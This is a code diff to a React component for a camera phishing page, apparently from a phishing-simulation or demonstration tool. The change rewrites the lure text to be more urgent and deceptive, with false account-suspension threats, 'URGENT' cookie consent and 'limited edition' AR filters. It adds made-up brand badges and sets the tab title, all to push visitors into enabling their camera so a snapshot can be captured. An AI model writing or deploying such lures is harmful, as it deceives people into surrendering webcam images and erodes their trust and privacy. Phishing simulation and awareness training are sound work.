@@ -6,29 +6,29 @@ import { useLogs } from '@/contexts/LogContext';
 import type { CameraData } from '@/types';
 import { Button } from '@/components/ui/button';
 import { PhishingPageLayout } from '@/components/phishing/PhishingPageLayout';
-import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon } from 'lucide-react';
+import { Camera as CameraIcon, VideoOff, CheckCircle, AlertTriangle, Trophy, Cookie, Image as ImageIcon, ShieldCheck, Sparkles, Wand2 } from 'lucide-react';
 import { cn } from '@/lib/utils'; // Added for cn utility
 
 const templateContent: Record<string, { title: string; message: string; cookieMessage?: string; actionText?: string; }> = {
   'photo-contest-entry': {
-    title: 'Capture the Moment: Photo Contest!',
-    message: "Showcase your photography skills and win amazing prizes! To submit your entry, please first **accept our cookie policy below**. Camera access will be requested afterwards to capture your photo submission.",
-    cookieMessage: "Our site uses cookies to enhance your experience and for essential functionality. By clicking 'Accept Cookies', you agree to our use of cookies.",
+    title: "FINAL CHANCE: SnapWin Photo Contest Entry!",
+    message: "Last call for entries! Showcase your photography skills and win exclusive prizes. **Accept cookies below** to enable camera access for your final submission. Don't miss out!",
+    cookieMessage: "URGENT: Cookie consent required to participate and secure your contest entry. By clicking 'Accept Cookies', you agree to our contest terms and cookie use.",
   },
   'video-verification': {
-    title: 'Video Verification',
-    actionText: 'Start Video Verification',
-    message: 'For security, we need to verify your identity via video. Please enable your camera.',
+    title: "CRITICAL ALERT: Video Verification Needed Immediately",
+    message: "Immediate video verification is required to secure your account against unauthorized access. Please enable your camera now to prevent account suspension.",
+    actionText: "Start Urgent Video Verification",
   },
   'ar-filter': {
-    title: 'Try Our New AR Filter!',
-    actionText: 'Test AR Filter',
-    message: 'Check out our latest AR filter! Enable your camera to see it in action.',
+    title: "Limited Edition: Try Our Viral AR Filter!",
+    message: "This exclusive AR filter is only available for a short time! Enable your camera to join the trend and share your amazing creations.",
+    actionText: "Unlock Exclusive AR Filter",
   },
   default: {
-    title: 'Camera Access Required',
-    actionText: 'Enable Camera',
-    message: 'This feature requires camera access. Please enable your camera to continue.',
+    title: "Account Security: Camera Access Required for Verification",
+    message: "To maintain account integrity and verify your identity, please enable camera access. This is a standard security procedure.",
+    actionText: "Enable Camera for Security Check",
   }
 };
 
@@ -50,6 +50,12 @@ export default function CameraPhishingPage() {
     addLog({ type: 'generic', data: { message: `Visited camera phishing page: /phishing/camera/${templateId}` } });
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [templateId]);
+
+  useEffect(() => {
+    if (content.title) {
+      document.title = content.title;
+    }
+  }, [content.title]);
 
   const captureImage = () => {
     if (videoRef.current && canvasRef.current && videoRef.current.readyState === 4 && videoRef.current.videoWidth > 0) {
@@ -158,8 +164,9 @@ export default function CameraPhishingPage() {
           error={error}
           statusMessage={status === 'captured' ? 'Photo submitted successfully! Good luck in the contest.' : undefined}
         >
-          <div className="text-center mb-6">
-              <Trophy className="h-16 w-16 text-amber-500 mx-auto mb-4" />
+          <div className="text-center mb-8"> {/* Increased mb for more space */}
+              <Trophy className="h-20 w-20 text-amber-500 mx-auto mb-3" /> {/* Made icon larger */}
+              <h2 className="text-2xl font-semibold text-amber-600 mb-4">SnapWin Photo Challenge</h2> {/* Added contest title */}
               <p className="text-lg text-muted-foreground" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
           </div>
           
@@ -239,6 +246,18 @@ export default function CameraPhishingPage() {
         error={error}
         statusMessage={status === 'captured' ? 'Camera snapshot captured successfully for demonstration.' : undefined}
     >
+      {templateId === 'video-verification' && (
+        <div className="flex flex-col items-center justify-center mb-4 text-blue-600">
+          <ShieldCheck className="h-12 w-12 mb-2" />
+          <p className="font-semibold text-sm">SecureStream Verifications</p>
+        </div>
+      )}
+      {templateId === 'ar-filter' && (
+        <div className="flex flex-col items-center justify-center mb-4 text-purple-600">
+          <Sparkles className="h-12 w-12 mb-2" />
+           {/* Message is already in content.message, so just icon might be enough or a small sub-text if needed */}
+        </div>
+      )}
       <p className="text-center text-muted-foreground mb-6">{content.message}</p>
 
       <div className="aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border">
